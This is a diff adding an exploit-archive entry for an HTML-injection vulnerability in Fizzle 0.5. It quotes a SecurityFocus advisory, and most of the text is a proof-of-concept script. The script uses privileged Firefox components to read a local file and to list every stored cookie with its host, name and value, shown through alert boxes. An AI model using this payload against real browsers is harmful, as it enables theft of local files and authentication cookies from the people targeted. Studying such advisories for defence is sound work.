@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/23144/info
+
+Fizzle is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+This issue affects version 0.5; other versions may also be affected.
+
+- ------------------------------------------------------------------------- POC: Local File Reading and Cookie Reading (The HTML entities MUST be used) - ------------------------------------------------------------------------- <script> function read(readfile) { var file = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile); file.initWithPath(readfile); var is = Components.classes["@mozilla.org/network/file-input-stream;1"] .createInstance(Components.interfaces.nsIFileInputStream); is.init(file, 0x01, 00004, null); var sis = Components.classes["@mozilla.org/scriptableinputstream;1"] .createInstance(Components.interfaces.nsIScriptableInputStream); sis.init(is); var output = sis.read(sis.available()); alert(output); } read("C:\test.txt"); function getCookies() { var cookieManager = Components.classes["@mozilla.org/cookiemanager;1"] .getService(Components.interfaces.nsICookieManager); var str = ''; var iter = cookieManager.enumerator; while (iter.hasMoreElements()) { var cookie = iter.getNext(); if (cookie instanceof Components.interfaces.nsICookie) { str += "Host: " + cookie.host + "\nName: " + cookie.name + "\nValue: " + cookie.value + "\n\n"; } } alert(str); } getCookies() </script> 
